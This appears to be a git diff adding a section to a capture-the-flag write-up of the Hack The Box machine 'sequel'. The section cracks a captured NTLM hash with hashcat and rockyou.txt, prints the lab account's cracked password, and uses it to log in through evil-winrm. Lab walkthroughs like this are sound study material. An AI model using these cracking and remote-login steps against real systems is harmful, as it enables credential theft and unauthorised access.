@@ -304,4 +304,36 @@ This method was taken from [hacktricks](https://book.hacktricks.xyz/network-serv
 
 Let's attempt to crack our newly obtained NTLM hash!
 
+1. Place the entire hash into a file named hash.txt
+2. Use hashcat to crack hash with specified wordlist such as rockyou.txt
+3. Obtain password or attempt to pass the hash around the network if it fails
+
+#### Cracking Hash
+
+```
+hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt -O
+```
+
+cracked.txt:
+
+{% code overflow="wrap" %}
+```
+SQL_SVC::sequel:aaaaaaaaaaaaaaaa:55c3306c2a424405a7723b2fd4438adb:01010000000000008085528dd979d90109cbfb83529a36f000000000010010006800530049006500640061006c006600030010006800530049006500640061006c006600020010006b007900590078005100640049004300040010006b007900590078005100640049004300070008008085528dd979d901060004000200000008003000300000000000000000000000003000003d52eb97775a1999339f81b907194ef13041aa9cdcb498705ec7a93bf279f7190a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320033000000000000000000:REGGIE1234ronnie
+```
+{% endcode %}
+
+#### Newly Acquired Credentials
+
+```
+SQL_SVC:REGGIE1234ronnie
+```
+
+### Authenticating via WinRM
+
+```
+evil-winrm -i sequel.htb -u SQL_SVC -p 'REGGIE1234ronnie'
+```
+
+<figure><img src="../../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
+
 ## Privilege Escalation
